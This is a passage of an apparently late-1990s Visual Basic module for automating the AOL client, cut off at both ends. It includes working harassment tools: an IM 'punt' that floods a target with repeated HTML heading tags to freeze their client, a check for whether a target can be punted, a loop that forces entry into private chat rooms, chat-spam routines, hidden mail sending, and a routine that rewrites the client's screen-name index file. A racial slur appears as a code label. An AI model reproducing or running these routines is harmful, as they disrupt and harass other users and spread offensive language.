Dim ListPersonHold As Long
Dim ReadBytes As Long
    

mailwin = FindChildByTitle(AOLMDI(), "Member Directory Search Results")
AOLHandle = FindChildByClass(mailwin, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
a = Len(Person$)
Person$ = Right$(Person$, a - 1)
For Trimspace = 1 To Len(Person$)
TheChar$ = Mid(Person$, Trimspace, 1)
thechars$ = thechars$ & TheChar$
If TheChar$ = Chr(9) Then GoTo CONTE
Next Trimspace
CONTE:
thechars$ = TrimSpaces(thechars$)
thechars$ = TrimReturns(thechars$)
box.AddItem thechars$
TheChar$ = ""
thechars$ = ""
Next Index
Call CloseHandle(AOLProcessThread)
End If
Call killwin(mailwin)
End Function

Sub Anti45MinTimer()
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
Click (AOIcon%)
End Sub

Function WriteErrorNameToList(lst As ListBox)
'Not working yet 4/8/98
MESSA = Mail_GetErrorMessage
LC = GetLineCount(MESSA)

a = 1

Start:
thetext = LineFromText(MESSA, a)
Stcount = Len(thetext)
SC = Stcount - 34
AC2 = Left$(thetext, SC)
lst.AddItem AC2
a = a + 1
GoTo Start
Last:
End Function

Function Test1()
'LB_SETCURSEL
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

mailwin = FindChildByTitle(AOLMDI(), "Member Directory Search Results")
AOLHandle = FindChildByClass(mailwin, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_DELETESTRING, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
a = Len(Person$)
Person$ = Right$(Person$, a - 1)
For Trimspace = 1 To Len(Person$)
TheChar$ = Mid(Person$, Trimspace, 1)
thechars$ = thechars$ & TheChar$
If TheChar$ = Chr(9) Then GoTo CONTE
Next Trimspace
CONTE:
'box.AddItem theChars$
TheChar$ = ""
thechars$ = ""
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Function


Function MessageFromIM()
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMtext% = FindChildByClass(IM%, "RICHCNTL")
IMmessage = AOLGetText(IMtext%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(IMmessage, Len(IMmessage) - 1)
End Function

Sub SizeFormToWindow(frm As Form, win%)
Dim wndRect As RECT, lRet As Long
lRet = GetWindowRect(win%, wndRect)
With frm
  .Top = wndRect.Top * Screen.TwipsPerPixelY
  .Left = wndRect.Left * Screen.TwipsPerPixelX
  .Height = ((wndRect.Bottom) - (wndRect.Top)) * Screen.TwipsPerPixelY
  .Width = ((wndRect.Right) - (wndRect.Left)) * Screen.TwipsPerPixelX
End With
End Sub
Sub StuffOff(frm As Form, btn As Object)
With btn
   .FontItalic = False
   .FontStrikethru = False
   .FontUnderline = False
End With
End Sub
Function SNfromIM()
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
heh$ = GetCaption(IM%)
Naw$ = Mid(heh$, InStr(heh$, ":") + 2)
SNfromIM = Naw$
End Function
Function AOLGetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
Trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, Trimspace$)

AOLGetText = Trimspace$
End Function

Sub AOLIcon(icon%)
Click2% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Click2% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AOLInstantMessage(Person, Message)
Call RunMenuByString(AOLWindow(), "Send an Instant Message")

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Send Instant Message")
aoledit% = FindChildByClass(IM%, "_AOL_Edit")
aolrich% = FindChildByClass(IM%, "RICHCNTL")
IMSEnd% = FindChildByClass(IM%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And IMSEnd% <> 0 Then Exit Do
Loop
Call AOLSetText(aoledit%, Person)
Call AOLSetText(aolrich%, Message)
IMSEnd% = FindChildByClass(IM%, "_AOL_Icon")
For sEnds = 1 To 9
IMSEnd% = GetWindow(IMSEnd%, 2)
Next sEnds
AOLIcon (IMSEnd%)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(IM%, WM_CLOSE, 0, 0): Exit Do
If IM% = 0 Then Exit Do
Loop
End Sub
Function AOLChildIM()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Send Instant Message")
IMSEnd% = FindChildByClass(IM%, "_AOL_Icon")
AOLChildIM = IMSEnd%
End Function
Function MakeIM(Person, Message)
Call RunMenuByString(AOLWindow(), "Send an Instant Message")

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Send Instant Message")
aoledit% = FindChildByClass(IM%, "_AOL_Edit")
aolrich% = FindChildByClass(IM%, "RICHCNTL")
IMSEnd% = FindChildByClass(IM%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And IMSEnd% <> 0 Then Exit Do
Loop
Call AOLSetText(aoledit%, Person)
Call AOLSetText(aolrich%, Message)
SendKeys "{TAB}"
End Function
Function AOLIsOnline()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
Welcome% = FindChildByTitle(MDI%, "Welcome, ")
If Welcome% = 0 Then
AOLIsOnline = 0
Exit Function
End If
AOLIsOnline = 1
End Function
Public Sub AOLLoadAol()
On Error Resume Next
Dim X%
X% = Shell("C:\aol30\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol30a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol30b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol25\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol25a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol25b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub
Function AOLIMScan()
aolcl% = FindWindow("#32770", "America Online")
If aolcl% > 0 Then
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(IM%, WM_CLOSE, 0, 0): Exit Do
If IM% = 0 Then Exit Do
Loop
MsgBox "This person is lame and has their imz off!"
End If
If aolcl% = 0 Then
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(IM%, WM_CLOSE, 0, 0): Exit Do
If IM% = 0 Then Exit Do
Loop
MsgBox "This person has their imz on, so you can punt em!"
End If
End Function

Sub AOLKeyword(Text)
Call RunMenuByString(AOLWindow(), "Keyword...")

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
keyw% = FindChildByTitle(MDI%, "Keyword")
Kedit% = FindChildByClass(keyw%, "_AOL_Edit")
If Kedit% Then Exit Do
Loop

editsend% = SendMessageByString(Kedit%, WM_SETTEXT, 0, Text)
pausing = DoEvents()
Sending% = SendMessage(Kedit%, WM_CHAR, 13, 0)
pausing = DoEvents()
End Sub

Function AOLLastChatLine()
getpar% = AOLFindRoom()
child = FindChildByClass(getpar%, "_AOL_View")
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
Trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, Trimspace$)

theview$ = Trimspace$


For FindChar = 1 To Len(theview$)
TheChar$ = Mid(theview$, FindChar, 1)
thechars$ = thechars$ & TheChar$

If TheChar$ = Chr(13) Then
thechatext$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
LastLine = Mid(theview$, lastlen + 1, Len(thechars$) - 1)
AOLLastChatLine = LastLine
End Function

Sub Mail_SendNew(Person, subject, Message)
Call RunMenuByString(AOLWindow(), "Compose Mail")

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Compose Mail")
'Call MinWindow(mailwin%)
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop
a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, Message)
pause (0.1)
AOLIcon (icone%)
'Call HideWindow(mailwin%)
AOLIcon (icone%)
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Compose Mail")
Erro% = FindChildByTitle(MDI%, "Error")
AOLW% = FindWindow("_AOL_Modal", vbNullString)
If mailwin% = 0 Then Exit Do
If AOLW% <> 0 Then
a = SendMessage(AOLW%, WM_CLOSE, 0, 0)
AOLButton (FindChildByTitle(AOLW%, "OK"))
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Sub
End If
If Erro% <> 0 Then
a = SendMessage(Erro%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
Last:
End Sub
Sub Mail_SendNew3(Person, subject, Message)
Call RunMenuByString(AOLWindow(), "Compose Mail")

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Compose Mail")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop

a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, Message)
AOLIcon (icone%)
HideWindow (mailwin%)
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Compose Mail")
Erro% = FindChildByTitle(MDI%, "Error")
AOLW% = FindWindow("_AOL_Modal", vbNullString)
If mailwin% = 0 Then Exit Do
If AOLW% <> 0 Then
a = SendMessage(AOLW%, WM_CLOSE, 0, 0)
AOLButton (FindChildByTitle(AOLW%, "OK"))
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Sub
End If
If Erro% <> 0 Then
a = SendMessage(Erro%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
Last:
End Sub
Sub Mail_SendNew2(Person, subject, Message)
Call RunMenuByString(AOLWindow(), "Compose Mail")

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Compose Mail")
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop

a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, Message)
X = MsgBox("Please Attch File And Send", vbCritical, "BuM Auto Tagger l3y GenghisX")
Last:
End Sub
Public Sub AOLPuntClassicFreeze(lam0r$)
Call AOLInstantMessage(lam0r$, "<h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h3><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3><h1><h3>")
End Sub

Public Sub DeathStar2Anti()
Do
nah% = FindChildByTitle(AOLMDI(), "Untitled")
IMRich% = FindChildByClass(nah%, "RICHCNTL")
Call AOLSetText(Anti%, "Death Star Punt Deflect0r² - Punt Blocked!")
DoEvents:
If IMRich% <> 0 Then
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
LabHIDE = ShowWindow(nah%, SW_HIDE)
AOLChatSend "•´¯`•–› dea†h s†ar pun† deflec†0r² •"
AOLChatSend "•´¯`•–› by shlep, epa, & err0r •"
AOLChatSend "•´¯`•–› " & LCase$(SNfromIM()) & ", you punting me? •"
AOLChatSend "•´¯`•–› your ass has been rejected bi0tch! •"
End If
Loop
End Sub

Public Sub DeathStar2Emergency()
Do
blah% = FindChildByTitle(AOLMDI(), "Untitled")
IMRich% = FindChildByClass(blah%, "RICHCNTL")
DoEvents:
If IMRich% <> 0 Then
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
LabHIDE = ShowWindow(blah%, SW_HIDE)
AOLChatSend "•´¯`•–› dea†h s†ar pun† deflec†0r² •"
AOLChatSend "•´¯`•–› by shlep, epa, & err0r •"
AOLChatSend "•´¯`•–› " & LCase$(SNfromIM()) & ", is that a punt string? •"
AOLChatSend "•´¯`•–› you can't freeze this emergency bi0tch! •"
End If
Loop
End Sub


Sub AOLUpChat()
AOM% = FindWindow("_AOL_MODAL", 0&)
If Left$(GetCaption(AOM%), 4) <> "File" Then MsgBox "No file transfer detected.", 0, "Error": Exit Sub
MoveWindow AOM%, 0, 0, 160, -95, 1
AC_KillModal
End Sub

Sub AC_KillModal()
DoEvents
AOM% = FindWindow("_AOL_MODAL", 0&)
Q% = EnableWindow(AOM%, 0)
aol% = FindWindow("AOL Frame25", 0&)
Q% = EnableWindow(aol%, 1)
End Sub
Sub AOL4_ChatSEnd(txt)
'SEndz txt to a chat room
    room% = AOL4_FindRoom()
    If room% Then
        hChatEdit% = Find2ndChildByClass(room%, "RICHCNTL")
        ret = SendMessageByString(hChatEdit%, WM_SETTEXT, 0, txt)
        ret = SendMessageByNum(hChatEdit%, WM_CHAR, 13, 0)
    End If
End Sub
Function AOL4_FindRoom()
'Findz the chat room/setz focus on it
    aol% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(aol%, "MDIClient")
    firs% = GetWindow(MDI%, 5)
    listers% = FindChildByClass(firs%, "RICHCNTL")
    listere% = FindChildByClass(firs%, "RICHCNTL")
    listerb% = FindChildByClass(firs%, "_AOL_Listbox")
    Do While (listers% = 0 Or listere% = 0 Or listerb% = 0) And (L <> 100)
            DoEvents
            firs% = GetWindow(firs%, 2)
            listers% = FindChildByClass(firs%, "RICHCNTL")
            listere% = FindChildByClass(firs%, "RICHCNTL")
            listerb% = FindChildByClass(firs%, "_AOL_Listbox")
            If listers% And listere% And listerb% Then Exit Do
            L = L + 1
    Loop
    If (L < 100) Then
        AOL4_FindRoom = firs%
        Exit Function
    End If
    
    'AOLFindRoom = 0
End Function

Sub AOL4_InstantMessage(Person, Message)
Call AOL4_Keyword("aol://9293:" & Person)
pause (2)
Do
DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
IM% = FindChildByTitle(MDI%, "SEnd Instant Message")
aolrich% = FindChildByClass(IM%, "RICHCNTL")
IMSEnd% = FindChildByClass(IM%, "_AOL_Icon")
Loop Until (IM% <> 0 And aolrich% <> 0 And IMSEnd% <> 0)
Call SendMessageByString(aolrich%, WM_SETTEXT, 0, Message)
For sEnds = 1 To 9
IMSEnd% = GetWindow(IMSEnd%, GW_HWNDNEXT)
Next sEnds
AOLIcon IMSEnd%
If IM% Then Call killwin(IM%)
End Sub
Sub AOL4_Keyword(txt)
'This goes to an AOL Keyword
    aol% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(aol%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    KWBox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(KWBox%, WM_SETTEXT, 0, txt)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub

Sub AOL4_SignOff()
Call RunMenuByString(AOLWindow(), "Sign Off")
End Sub

Sub AOLResetNewUser(SN As String, tru_sn As String, pth As String)
'creates a new sn
'example : Call AOLResetNewUser("NewSN", "CurrentSN", "C:\aol30\Organize")
Screen.MousePointer = 11
Static m0226 As String * 40000
Dim l9E68 As Long
Dim l9E6A As Long
Dim l9E6C As Integer
Dim l9E6E As Integer
Dim l9E70 As Variant
Dim l9E74 As Integer
If UCase$(Trim$(SN)) = "NEWUSER" Then MsgBox ("AOL is already on new user!"): Exit Sub
On Error GoTo no_reset
If Len(SN) < 7 Then MsgBox ("The screen name has to be at least 7 characters long :)"): Exit Sub
tru_sn = tru_sn + String$(Len(SN) - 7, " ")
Let paath$ = (pth & "\idb\main.idx")
Open paath$ For Binary As #1
l9E68& = 1
l9E6A& = LOF(1)
While l9E68& < l9E6A&
    m0226 = String$(16384, Chr$(0))
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
    Wend
    
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 40000
Wend

Seek #1, Len(SN)
l9E68& = Len(SN)
While l9E68& < l9E6A&
m0226 = String$(16384, " ")
    Get #1, l9E68&, m0226
    While InStr(UCase$(m0226), UCase$(SN)) <> 0
        Mid$(m0226, InStr(UCase$(m0226), UCase$(SN))) = tru_sn
        Wend
    Put #1, l9E68&, m0226
    l9E68& = l9E68& + 16384
Wend
Close #1
Screen.MousePointer = 0
no_reset:
Screen.MousePointer = 0
Exit Sub
Resume Next
End Sub
Public Sub AOLSixTeenLine(txt As TextBox)
a = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(a, D)
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.7
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.7
End Sub
Sub File_BirthDay(File$)
If Not File_IfileExists(File$) Then Exit Sub
MsgBox FileDateTime(File$)
NoFreeze% = DoEvents()
End Sub
Sub File_Copy(File$, DestFile$)
If Not File_IfileExists(File$) Then Exit Sub
FileCopy File$, DestFile$
End Sub
Sub File_Delete(File$)
If Not File_IfileExists(File$) Then Exit Sub
Kill File$
NoFreeze% = DoEvents()
End Sub

Function BustInPR(PR As String)
OLDNAME = GetCaption(AOLFindRoom())
tries = 0
again:
tries = tries + 1
pause (0.7)
AOLChangeCaption ("|Genghis| Busting into " & PR & " Tries: " & tries)
Call AOLKeyword("aol://2719:2-2-" & PR)
X = AOLFindRoom
If X = O Then
NotFound% = FindChildByTitle(aol%, "America Online")
killwin (NotFound%)
GoTo again
End If
'Unfinished 4/9/98
End Function

Sub File_DeleteDir(DirName$)
If Not File_IfDirectoryExists(DirName$) Then Exit Sub
RmDir DirName$
End Sub
Sub File_DeleteDirectory(DirName$)
If Not File_IfDirectoryExists(DirName$) Then Exit Sub
RmDir DirName$
End Sub



Function File_IfDirectoryExists(TheDirectory)
Dim Check As Integer
On Error Resume Next
If Right(TheDirectory, 1) <> "/" Then TheDirectory = TheDirectory + "/"
Check = Len(Dir$(TheDirectory))
If Err Or Check = 0 Then
    File_IfDirectoryExists = False
Else
    File_IfDirectoryExists = True
End If
End Function


Sub File_MakeDirectory(DirName$)
MkDir DirName$
End Sub
Function File_IfileExists(ByVal sFileName As String) As Integer
'Example: If Not File_ifileexists("win.com") then...
Dim i As Integer
On Error Resume Next

    i = Len(Dir$(sFileName))
    
    If Err Or i = 0 Then
        File_IfileExists = False
        Else
            File_IfileExists = True
    End If

End Function
Function File_LoadINI(look$, FileNamer$) As String
On Error GoTo Sla
Open FileNamer$ For Input As #1
Do While Not EOF(1)
    Input #1, CheckOut$
    If InStr(UCase$(CheckOut$), UCase$(look$)) Then
        Where = InStr(UCase$(CheckOut$), UCase$(look$))
        out$ = Mid$(CheckOut$, Where + Len(look$))
        File_LoadINI = out$
    End If
Loop
Sla:
Close #1
Resume nigger
nigger:
End Function
Sub File_OpenEXE(File$)
OpenEXE = Shell(File$, 1): NoFreeze% = DoEvents()
End Sub






Sub File_ReName(File$, NewName$)
Name File$ As NewName$
NoFreeze% = DoEvents()
End Sub
Function Mail_KillText()
Mail% = FindOpenMail
mailtext% = FindChildByClass(Mail%, "RICHCNTL")
HideWindow (mailtext%)
Call RunMenuByString(AOLWindow(), "Keyword...")
End Function

Sub FormFlash(frm As Form)
frm.Show
frm.BackColor = &H0&
pause (".1")
frm.BackColor = &HFF&
pause (".1")
frm.BackColor = &HFF0000
pause (".1")
frm.BackColor = &HFF00&
pause (".1")
frm.BackColor = &H8080FF
pause (".1")
frm.BackColor = &HFFFF00
pause (".1")
frm.BackColor = &H80FF&
pause (".1")
frm.BackColor = &HC0C0C0
End Sub
Public Sub FortuneBot()
'steps...
'1. in Timer1 tye Call FortuneBot
'2. make 2 command buttons
'3. in command button 1 type-
'Timer1.enbled = True
'AOLChatSend "Type /fortune to get your fortune"
'4. in the command button 2 type-
'Timer1.enabled = false
'AOLChatSend "Fortune Bot Off!"
FreeProcess
timer1.interval = 1
On Error Resume Next
Dim Last As String
Dim name As String
Dim a As String
Dim n As Integer
Dim X As Integer
DoEvents
a = AOLLastChatLine
Last = Len(a)
For X = 1 To Last
name = Mid(a, X, 1)
Final = Final & name
If name = ":" Then Exit For
Next X
Final = Left(Final, Len(Final) - 1)
If Final = AOLGetUser Then
Exit Sub
Else
If InStr(a, "/fortune") Then
Randomize
rand = Int((Rnd * 10) + 1)
If rand = 1 Then Call AOLChatSend("" & Final & ", You will win the lottery and spend it all on BEER!")
If rand = 2 Then Call AOLChatSend("" & Final & ", You will kill Steve Case and take over AoL!")
If rand = 3 Then Call AOLChatSend("" & Final & ", You will marry Carmen Electra!")
If rand = 4 Then Call AOLChatSend("" & Final & ", You will DL a PWS and get thousands of bucks charged on your account!")
If rand = 5 Then Call AOLChatSend("" & Final & ", You will end up werking at McDonalds and die a lonely man")
If rand = 6 Then Call AOLChatSend("" & Final & ", You will get a check for ONE MILLION $$ from me! Yeah right!")
If rand = 7 Then Call AOLChatSend("" & Final & ", You will be OWNED by shlep")
If rand = 8 Then Call AOLChatSend("" & Final & ", You will be OWNED by epa")
If rand = 9 Then Call AOLChatSend("" & Final & ", You will get an OH and delete Steve Case's SN!")
If rand = 10 Then Call AOLChatSend("" & Final & ", You will slip on a banana peel in Japan and land on some egg foo yung!")
Call pause(0.6)
End If
End If
End Sub
Public Function GetListIndex(oListBox As ListBox, sText As String) As Integer

Dim iIndex As Integer

With oListBox
 For iIndex = 0 To .ListCount - 1
   If .List(iIndex) = sText Then
    GetListIndex = iIndex
    Exit Function
   End If
 Next iIndex
End With

GetListIndex = -2   '  if Item isnt found
'( I didnt want to use -1 as it evaluates to True)

End Function
Sub ListDeleteItem(lst As ListBox, item$)
Do
NoFreeze% = DoEvents()
If LCase$(lst.List(a)) = LCase$(item$) Then lst.RemoveItem (a)
a = 1 + a
Loop Until a >= lst.ListCount
End Sub
Public Sub TransferListToTextBox(lst As ListBox, txt As TextBox)
'This moves the individual highlighted part of a
'listbox to a textbox
Ind = lst.ListIndex
daname$ = lst.List(Ind)
txt.Text = ""
txt.Text = daname$
End Sub
Function UpChat()
Do
    X% = DoEvents()
aolmod = FindWindow("_AOL_Modal", 0&)
killwin (aolmod)
Loop Until aolmod = 0
End Function
Sub Win95_StartButton()
wind% = FindWindow("Shell_TrayWnd", 0&)
btn% = FindChildByClass(wind%, "Button")
SendNow% = SendMessageByNum(btn%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SendMessageByNum(btn%, WM_LBUTTONUP, &HD, 0)
End Sub
Sub AOLHIDENMail(Person, subject, Message)
Call RunMenuByString(AOLWindow(), "Compose Mail")
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Compose Mail")
HideWindow mailwin%
icone% = FindChildByClass(mailwin%, "_AOL_Icon")
peepz% = FindChildByClass(mailwin%, "_AOL_Edit")
subjt% = FindChildByTitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
mess% = FindChildByClass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And mess% <> 0 Then Exit Do
Loop

a = SendMessageByString(peepz%, WM_SETTEXT, 0, Person)
a = SendMessageByString(subjec%, WM_SETTEXT, 0, subject)
a = SendMessageByString(mess%, WM_SETTEXT, 0, Message)
AOLIcon (icone%)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
mailwin% = FindChildByTitle(MDI%, "Compose Mail")
Erro% = FindChildByTitle(MDI%, "Error")
AOLW% = FindWindow("_AOL_Modal", vbNullString)
If mailwin% = 0 Then Exit Do
If AOLW% <> 0 Then
a = SendMessage(AOLW%, WM_CLOSE, 0, 0)
AOLButton (FindChildByTitle(AOLW%, "OK"))
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Sub
End If
If Erro% <> 0 Then
